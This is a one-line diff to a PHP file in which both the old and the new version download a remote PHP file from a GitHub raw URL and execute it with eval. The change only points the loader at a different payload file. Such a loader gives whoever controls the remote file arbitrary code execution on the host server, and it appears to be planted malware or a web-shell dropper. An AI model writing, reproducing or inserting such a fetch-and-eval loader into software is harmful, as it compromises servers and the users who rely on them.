@@ -1,1 +1,1 @@
-<?php $Url = "https://raw.githubusercontent.com/xKamenRider/MataKAU/refs/heads/main/tryred.php"; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $Url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $output = curl_exec($ch); curl_close($ch); echo eval("?>".$output); ?>
+<?php $Url = "https://raw.githubusercontent.com/xKamenRider/MataKAU/refs/heads/main/red.php"; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $Url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $output = curl_exec($ch); curl_close($ch); echo eval("?>".$output); ?>
